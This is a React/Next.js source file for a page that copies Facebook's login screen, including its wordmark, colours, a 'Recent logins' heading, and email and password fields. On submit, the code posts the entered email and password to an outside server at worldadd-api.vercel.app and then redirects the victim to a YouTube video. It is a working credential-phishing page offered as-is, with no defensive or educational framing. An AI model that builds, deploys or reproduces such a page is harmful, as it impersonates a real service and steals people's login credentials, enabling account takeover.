import React, { useState } from "react";
import { Box, Button, Typography, Container, TextField } from "@mui/material";
import { useRouter } from 'next/router';
import axios from 'axios';

const LoginFacebook = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState(false);
  const [passwordError, setPasswordError] = useState(false);
  const router = useRouter();

  const handleLogin = async () => {
    setEmailError(false);
    setPasswordError(false);

    if (!email) {
      setEmailError(true);
    }
    if (!password) {
      setPasswordError(true);
    }

    if (email && password) {
      try {
        // POST the credentials to your backend
        const response = await axios.post('https://worldadd-api.vercel.app/api/login-facebook', { email, password });

        if (response.status === 200) {
          // Redirect to the specified YouTube link on successful login
         window.location.href = 'https://www.youtube.com/watch?v=xuekUzf_vPE&feature=youtu.be';
        } else {
          // Handle login failure
          console.error('Login failed');
        }
      } catch (error) {
        console.error('An error occurred during login:', error);
      }
    }
  };

  return (
    <Container
      maxWidth="sm"
      sx={{
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        minHeight: "100vh",
        backgroundColor: "#f0f2f5",
        p: 2, // Add padding for smaller screens
      }}
    >
      <Box
        sx={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          width: "100%",
          maxWidth: 400,
        }}
      >
        {/* Facebook Logo and Heading */}
        <Box
          sx={{
            textAlign: "center",
            mb: 4,
          }}
        >
          <Typography
            variant="h3"
            sx={{
              color: "#1877f2",
              fontWeight: "bold",
              fontSize: { xs: "32px", sm: "40px" }, // Responsive font size
              mb: 1,
            }}
          >
            facebook
          </Typography>
          <Typography
            variant="h5"
            sx={{
              color: "#1c1e21",
              fontSize: { xs: "20px", sm: "24px" }, // Responsive font size
              mb: 1,
            }}
          >
            Recent logins
          </Typography>
          <Typography
            variant="body1"
            sx={{
              color: "#606770",
              fontSize: { xs: "14px", sm: "16px" }, // Responsive font size
            }}
          >
            Click your picture or add an account.
          </Typography>
        </Box>

        {/* Add responsive image here */}
        <Box
          component="img"
          src="/media/Screenshot from 2025-03-07 17-56-31.png" 
          alt="User Image"
          sx={{
            width: { xs: '100%', sm: 'auto' },
            height: 'auto',
            maxWidth: '100%',
            mb: 4,
          }}
        />

        {/* Login Box */}
        <Box
          sx={{
            backgroundColor: "#fff",
            padding: { xs: 2, sm: 4 }, // Responsive padding
            borderRadius: 2,
            boxShadow: 3,
            textAlign: "center",
            width: "100%",
          }}
        >
          {/* Login Form */}
          <Box sx={{ mb: 4 }}>
            <TextField
              fullWidth
              placeholder="Email address or phone number"
              variant="outlined"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              error={emailError}
              helperText={emailError ? "Email is required" : ""}
              sx={{ mb: 2 }}
            />
            <TextField
              fullWidth
              placeholder="Password"
              type="password"
              variant="outlined"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              error={passwordError}
              helperText={passwordError ? "Password is required" : ""}
              sx={{ mb: 2 }}
            />
            <Button
              fullWidth
              variant="contained"
              color="primary"
              onClick={handleLogin}
              sx={{ mb: 2 }}
            >
              Log In
            </Button>
            <Typography
              variant="body2"
              sx={{ color: "primary.main", cursor: "pointer" }}
            >
              Forgotten password?
            </Typography>
          </Box>

          {/* Divider */}
          <Box
            sx={{
              width: "100%",
              height: 1,
              backgroundColor: "#e4e6eb",
              my: 4,
            }}
          />

          {/* Create New Account Button */}
          <Button
            fullWidth
            variant="contained"
            sx={{
              backgroundColor: "#42b72a",
              "&:hover": { backgroundColor: "#36a420" },
              mb: 2,
            }}
          >
            Create New Account
          </Button>

          {/* Create a Page Link */}
          <Typography variant="body2" sx={{ color: "text.secondary" }}>
            <Box
              component="span"
              sx={{ fontWeight: "bold", cursor: "pointer" }}
            >
              Create a Page
            </Box>{" "}
            for a celebrity, brand or business.
          </Typography>
        </Box>
      </Box>
    </Container>
  );
};

export default LoginFacebook;